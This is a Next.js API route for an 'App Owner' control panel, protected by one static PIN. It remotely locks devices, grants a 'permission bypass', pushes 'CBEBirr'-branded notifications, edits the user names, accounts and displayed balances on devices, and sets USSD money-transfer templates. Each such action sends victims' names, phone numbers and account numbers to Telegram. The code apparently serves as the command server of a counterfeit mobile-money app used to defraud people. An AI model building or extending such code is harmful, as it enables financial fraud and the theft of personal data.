import { NextRequest, NextResponse } from 'next/server';
import { OWNER_PIN } from '@/lib/owner-types';
import {
  clearNotificationsHistory,
  createOwnerNotification,
  getOwnerDashboardSnapshot,
  removeDeviceRecord,
  setDeviceApproval,
  setDeviceLock,
  setDevicePermissionBypass,
  setGlobalLock,
  updateDeviceDetailsByOwner,
  updateDeviceUssdByOwner,
} from '@/lib/owner-store';
import { sendTelegramMessage } from '@/lib/owner-telegram';

export const dynamic = 'force-dynamic';

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, x-owner-pin',
  'Cache-Control': 'no-store',
};

function isAuthorized(req: NextRequest, bodyPin?: unknown): boolean {
  const headerPin = req.headers.get('x-owner-pin') || '';
  const queryPin = new URL(req.url).searchParams.get('pin') || '';
  return headerPin === OWNER_PIN || queryPin === OWNER_PIN || bodyPin === OWNER_PIN;
}

export async function OPTIONS() {
  return new NextResponse(null, { status: 204, headers: CORS_HEADERS });
}

export async function GET(req: NextRequest) {
  if (!isAuthorized(req)) {
    return NextResponse.json(
      { success: false, error: 'Unauthorized' },
      { status: 401, headers: CORS_HEADERS }
    );
  }
  const snapshot = await getOwnerDashboardSnapshot(true);
  return NextResponse.json({ success: true, ...snapshot }, { headers: CORS_HEADERS });
}

export async function POST(req: NextRequest) {
  try {
    const body = await req.json().catch(() => ({}));
    if (!isAuthorized(req, body.ownerPin)) {
      return NextResponse.json(
        { success: false, error: 'Unauthorized' },
        { status: 401, headers: CORS_HEADERS }
      );
    }

    const action = String(body.action || '');

    if (action === 'lock_all' || action === 'unlock_all') {
      const locked = action === 'lock_all';
      const config = await setGlobalLock(locked, 'app_0069', body.message);
      await sendTelegramMessage(
        locked
          ? `🔒 <b>ALL devices LOCKED</b> via App Owner (<code>0069</code>).`
          : `🔓 <b>ALL devices UNLOCKED</b> via App Owner (<code>0069</code>).`
      ).catch(() => {});
      return NextResponse.json({ success: true, globalConfig: config }, { headers: CORS_HEADERS });
    }

    if (action === 'lock_device' || action === 'unlock_device') {
      const locked = action === 'lock_device';
      const device = await setDeviceLock(String(body.deviceId || ''), locked, body.reason);
      if (!device) {
        return NextResponse.json(
          { success: false, error: 'Device not found' },
          { status: 404, headers: CORS_HEADERS }
        );
      }
      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      await sendTelegramMessage(
        `${locked ? '🔒 LOCKED' : '🔓 UNLOCKED'} device <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>) via App Owner (<code>0069</code>).`
      ).catch(() => {});
      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
    }

    if (action === 'approve_device' || action === 'reject_device') {
      const approvalStatus = action === 'approve_device' ? 'approved' : 'rejected';
      const device = await setDeviceApproval(String(body.deviceId || ''), approvalStatus);
      if (!device) {
        return NextResponse.json(
          { success: false, error: 'Device not found' },
          { status: 404, headers: CORS_HEADERS }
        );
      }
      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      await sendTelegramMessage(
        `${approvalStatus === 'approved' ? '✅ <b>APPROVED</b>' : '❌ <b>REJECTED</b>'} device <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>)\n👤 ${esc(device.userName)} • 📞 ${esc(device.phoneNumber)} • 💳 ${esc(device.userAccount)}`
      ).catch(() => {});
      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
    }

    if (
      action === 'approve_permission_bypass' ||
      action === 'reject_permission_bypass' ||
      action === 'reset_permission_bypass'
    ) {
      const nextStatus =
        action === 'approve_permission_bypass'
          ? 'approved'
          : action === 'reject_permission_bypass'
            ? 'rejected'
            : 'none';
      const device = await setDevicePermissionBypass(String(body.deviceId || ''), nextStatus);
      if (!device) {
        return NextResponse.json(
          { success: false, error: 'Device not found' },
          { status: 404, headers: CORS_HEADERS }
        );
      }
      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      const label =
        nextStatus === 'approved'
          ? '🔓 <b>PERMISSION-FREE ENTRY ALLOWED</b>'
          : nextStatus === 'rejected'
            ? '🚫 <b>PERMISSION-FREE ENTRY DENIED</b>'
            : '🔒 <b>PERMISSION-FREE ENTRY REVOKED</b>';
      await sendTelegramMessage(
        `${label} for <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>) via App Owner.`
      ).catch(() => {});
      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
    }

    if (action === 'send_notification') {
      const msg = String(body.message || '').trim();
      const audioDataUrl = typeof body.audioDataUrl === 'string' ? body.audioDataUrl.trim() : '';
      const audioDurationSec =
        typeof body.audioDurationSec === 'number' && Number.isFinite(body.audioDurationSec)
          ? body.audioDurationSec
          : undefined;
      if (!msg && !audioDataUrl) {
        return NextResponse.json(
          { success: false, error: 'Notification text or voice message is required' },
          { status: 400, headers: CORS_HEADERS }
        );
      }
      const dur = Math.max(1, Math.min(86400, Number(body.durationSeconds) || 30));
      const notif = await createOwnerNotification({
        targetDeviceId: String(body.targetDeviceId || 'all'),
        title: String(body.title || 'CBEBirr'),
        message: msg,
        audioDataUrl: audioDataUrl || undefined,
        audioDurationSec,
        durationSeconds: dur,
        sentBy: 'app_0069',
      });
      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      const voiceTag = notif.audioDataUrl ? ` 🎙️ Voice (${notif.audioDurationSec || 0}s)` : '';
      await sendTelegramMessage(
        `📢 <b>Notification sent via App Owner (<code>0069</code>)</b>${voiceTag}\nTarget: <code>${esc(notif.targetDeviceId)}</code> • Duration: ${notif.durationSeconds}s\nMessage: ${esc(notif.message)}`
      ).catch(() => {});
      return NextResponse.json({ success: true, notification: notif }, { headers: CORS_HEADERS });
    }

    if (action === 'update_device_details') {
      const deviceId = String(body.deviceId || '').trim();
      if (!deviceId) {
        return NextResponse.json(
          { success: false, error: 'deviceId is required' },
          { status: 400, headers: CORS_HEADERS }
        );
      }
      if (body.balance !== undefined) {
        const b = Number(body.balance);
        if (!Number.isFinite(b) || b < 0 || b > 1_000_000_000) {
          return NextResponse.json(
            { success: false, error: 'Invalid balance amount' },
            { status: 400, headers: CORS_HEADERS }
          );
        }
      }
      if (body.rewardBalance !== undefined) {
        const r = Number(body.rewardBalance);
        if (!Number.isFinite(r) || r < 0 || r > 1_000_000_000) {
          return NextResponse.json(
            { success: false, error: 'Invalid reward amount' },
            { status: 400, headers: CORS_HEADERS }
          );
        }
      }

      const device = await updateDeviceDetailsByOwner(deviceId, {
        deviceName: body.deviceName !== undefined ? String(body.deviceName) : undefined,
        userName: body.userName !== undefined ? String(body.userName) : undefined,
        phoneNumber: body.phoneNumber !== undefined ? String(body.phoneNumber) : undefined,
        userAccount: body.userAccount !== undefined ? String(body.userAccount) : undefined,
        balance: body.balance,
        rewardBalance: body.rewardBalance,
        appLang: body.appLang !== undefined ? String(body.appLang) : undefined,
        isBalanceShown:
          body.isBalanceShown !== undefined ? Boolean(body.isBalanceShown) : undefined,
        isRewardShown:
          body.isRewardShown !== undefined ? Boolean(body.isRewardShown) : undefined,
      });

      if (!device) {
        return NextResponse.json(
          { success: false, error: 'Device not found' },
          { status: 404, headers: CORS_HEADERS }
        );
      }

      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      await sendTelegramMessage(
        `✏️ <b>Device Details Updated via Owner (<code>0069</code>)</b>\n📱 <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>)\n👤 ${esc(device.userName)} • 📞 ${esc(device.phoneNumber)} • 💳 ${esc(device.userAccount)}\n💰 Bal: ${Number(device.balance || 0).toFixed(2)} ETB • Reward: ${Number(device.rewardBalance || 0).toFixed(2)} ETB • Lang: ${esc(device.appLang || 'en')}`
      ).catch(() => {});

      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
    }

    if (action === 'update_device_ussd') {
      const deviceId = String(body.deviceId || '').trim();
      if (!deviceId) {
        return NextResponse.json(
          { success: false, error: 'deviceId is required' },
          { status: 400, headers: CORS_HEADERS }
        );
      }

      const validateProfiles = (arr: unknown): string | null => {
        if (arr === undefined) return null;
        if (!Array.isArray(arr)) return 'Invalid USSD profiles list';
        for (const item of arr) {
          if (!item || typeof item !== 'object') return 'Invalid USSD profile entry';
          const tpl = String((item as Record<string, unknown>).template || '').trim();
          if (!tpl) return 'USSD template cannot be empty';
          if (tpl.length > 120) return 'USSD template exceeds 120 characters';
          if (!/^[*#0-9+a-zA-Z{}\[\]_\-\s]+$/.test(tpl)) {
            return 'USSD template contains invalid characters';
          }
        }
        return null;
      };

      const errCbe = validateProfiles(body.ussdProfiles);
      if (errCbe) {
        return NextResponse.json(
          { success: false, error: errCbe },
          { status: 400, headers: CORS_HEADERS }
        );
      }
      const errPhone = validateProfiles(body.phoneUssdProfiles);
      if (errPhone) {
        return NextResponse.json(
          { success: false, error: errPhone },
          { status: 400, headers: CORS_HEADERS }
        );
      }

      const device = await updateDeviceUssdByOwner(deviceId, {
        ussdProfiles: body.ussdProfiles,
        activeUssdId: body.activeUssdId !== undefined ? String(body.activeUssdId) : undefined,
        phoneUssdProfiles: body.phoneUssdProfiles,
        activePhoneUssdId:
          body.activePhoneUssdId !== undefined ? String(body.activePhoneUssdId) : undefined,
      });

      if (!device) {
        return NextResponse.json(
          { success: false, error: 'Device not found' },
          { status: 404, headers: CORS_HEADERS }
        );
      }

      const esc = (s: string) =>
        String(s || '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      await sendTelegramMessage(
        `✳️ <b>Transfer USSD Settings Updated via Owner (<code>0069</code>)</b>\n📱 <b>${esc(device.deviceName)}</b> (<code>${esc(device.deviceId)}</code>)\n🏦 Step 6 Active: <code>${esc(device.activeUssdId || '')}</code>\n📞 Step 15 Active: <code>${esc(device.activePhoneUssdId || '')}</code>`
      ).catch(() => {});

      return NextResponse.json({ success: true, device }, { headers: CORS_HEADERS });
    }

    if (action === 'delete_device') {
      const deleted = await removeDeviceRecord(String(body.deviceId || ''));
      return NextResponse.json({ success: true, deleted }, { headers: CORS_HEADERS });
    }

    if (action === 'clear_notifications') {
      await clearNotificationsHistory();
      return NextResponse.json({ success: true }, { headers: CORS_HEADERS });
    }

    return NextResponse.json(
      { success: false, error: `Unknown action: ${action}` },
      { status: 400, headers: CORS_HEADERS }
    );
  } catch (error: any) {
    return NextResponse.json(
      { success: false, error: error?.message || 'Control action failed' },
      { status: 500, headers: CORS_HEADERS }
    );
  }
}
